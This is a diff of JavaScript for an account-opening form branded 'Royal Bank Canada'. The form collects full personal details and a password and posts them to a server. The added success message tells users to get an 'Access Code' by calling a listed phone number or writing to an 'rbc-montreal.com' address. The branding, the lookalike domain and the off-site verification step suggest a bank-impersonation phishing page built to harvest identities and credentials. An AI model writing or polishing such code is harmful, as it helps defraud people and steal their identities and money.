@@ -9,106 +9,107 @@ const form = document.getElementById("openAccountForm");
 
 form.addEventListener("submit", createAccount);
 
-async function createAccount(e){
+async function createAccount(e) {
 
-e.preventDefault();
+    e.preventDefault();
 
-const data = {
+    const data = {
 
-firstName:document.getElementById("firstname").value.trim(),
+        firstName: document.getElementById("firstname").value.trim(),
+        lastName: document.getElementById("lastname").value.trim(),
+        email: document.getElementById("email").value.trim().toLowerCase(),
+        phone: document.getElementById("phone").value.trim(),
+        birthDate: document.getElementById("birthdate").value,
+        gender: document.getElementById("gender").value,
+        nationality: document.getElementById("nationality").value.trim(),
+        profession: document.getElementById("profession").value.trim(),
+        country: document.getElementById("country").value.trim(),
+        city: document.getElementById("city").value.trim(),
+        address: document.getElementById("address").value.trim(),
+        accountType: document.getElementById("accountType").value,
+        currency: document.getElementById("currency").value,
+        password: document.getElementById("password").value,
+        confirmPassword: document.getElementById("confirmPassword").value
 
-lastName:document.getElementById("lastname").value.trim(),
+    };
 
-email:document.getElementById("email").value.trim().toLowerCase(),
+    if (data.password !== data.confirmPassword) {
 
-phone:document.getElementById("phone").value.trim(),
+        alert("Passwords do not match.");
+        return;
 
-birthDate:document.getElementById("birthdate").value,
+    }
 
-gender:document.getElementById("gender").value,
+    if (data.password.length < 8) {
 
-nationality:document.getElementById("nationality").value.trim(),
+        alert("Password must contain at least 8 characters.");
+        return;
 
-profession:document.getElementById("profession").value.trim(),
+    }
 
-country:document.getElementById("country").value.trim(),
+    try {
 
-city:document.getElementById("city").value.trim(),
+        const response = await fetch(
+            `${API_URL}/api/open-account`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            }
+        );
 
-address:document.getElementById("address").value.trim(),
+        const result = await response.json();
 
-accountType:document.getElementById("accountType").value,
+        if (response.ok) {
 
-currency:document.getElementById("currency").value,
+            alert(
+`ROYAL BANK CANADA
 
-password:document.getElementById("password").value,
+Your account has been successfully created.
 
-confirmPassword:document.getElementById("confirmPassword").value
+Customer ID:
+${result.customerId}
 
-};
+Account Number:
+${result.accountNumber}
 
-if(data.password!==data.confirmPassword){
+Transit Number:
+${result.transitNumber}
 
-alert("Passwords do not match.");
+Institution Number:
+${result.institutionNumber}
 
-return;
+------------------------------------
 
-}
+For security reasons, your Access Code is not displayed online.
 
-if(data.password.length<8){
+Please contact Royal Bank Canada Customer Service to obtain your Access Code after verification of your identity.
 
-alert("Password must contain at least 8 characters.");
+Phone:
++1 902 600 0017
 
-return;
+Email:
+clientsupport@rbc-montreal.com
 
-}
+Please keep your Customer ID and Password in a safe place.`
+            );
 
-try{
+            window.location.href = "login.html";
 
-const response = await fetch(
+        } else {
 
-`${API_URL}/api/open-account`,
+            alert(result.message || "Unable to create your account.");
 
-{
+        }
 
-method:"POST",
+    } catch (error) {
 
-headers:{
+        console.error(error);
 
-"Content-Type":"application/json"
+        alert("Unable to contact the Royal Bank Canada server.");
 
-},
-
-body:JSON.stringify(data)
-
-}
-
-);
-
-const result = await response.json();
-
-if(response.ok){
-
-alert(
-
-"Your application has been successfully submitted to Royal Bank Canada."
-
-);
-
-window.location.href="login.html";
-
-}else{
-
-alert(result.message || "Unable to create your account.");
-
-}
-
-}catch(error){
-
-console.error(error);
-
-alert("Unable to contact the Royal Bank Canada server.");
-
-}
+    }
 
 }
